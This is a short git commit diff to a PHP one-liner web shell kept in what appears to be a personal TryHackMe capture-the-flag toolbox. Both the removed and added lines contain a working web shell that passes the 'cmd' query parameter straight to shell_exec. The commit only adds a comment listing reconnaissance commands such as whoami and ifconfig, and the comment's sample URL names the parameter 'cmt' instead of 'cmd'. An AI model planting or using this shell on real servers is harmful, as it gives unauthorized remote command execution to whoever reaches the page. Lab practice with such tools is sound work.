7882b5c43966b2a287dfc053e877d933e1a1ba14
Rebekah <macrosystem@proton.me>
2024-09-23 19:30:05 +0200

    Update web-shell-oneliner.php

--- tryhackme/123-tool-box/web-shell-oneliner.php
+++ tryhackme/123-tool-box/web-shell-oneliner.php
@@ -1,1 +1,1 @@
-<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; /* https://url?cmt=<your command here> */ ?>
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; /* https://url?cmt=<your command here> *//*useful: ifconfig, ip a, ipconfig (windows), whoami, hostname, arch */ ?>
